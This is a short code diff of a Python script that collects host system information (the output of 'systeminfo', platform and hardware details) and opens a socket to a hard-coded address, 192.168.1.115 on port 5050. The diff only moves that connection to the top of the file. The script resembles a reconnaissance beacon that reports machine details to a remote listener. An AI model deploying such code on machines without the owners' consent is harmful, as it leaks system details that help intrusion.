@@ -1,6 +1,9 @@
-from socket import *
 import platform,socket,re,uuid,json,psutil,logging
 import subprocess
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.1.115",5050))
 
 def getSystemInfo():
     try:
@@ -17,9 +20,6 @@ def getSystemInfo():
         return json.dumps(info)
     except Exception as e:
         logging.exception(e)
-
-s = socket(AF_INET, SOCK_STREAM)
-s.connect(("192.168.1.115",5050))
 
 data1 = str(subprocess.check_output("systeminfo",shell=True,stderr=subprocess.STDOUT))
 data2 = str(json.loads(getSystemInfo()))
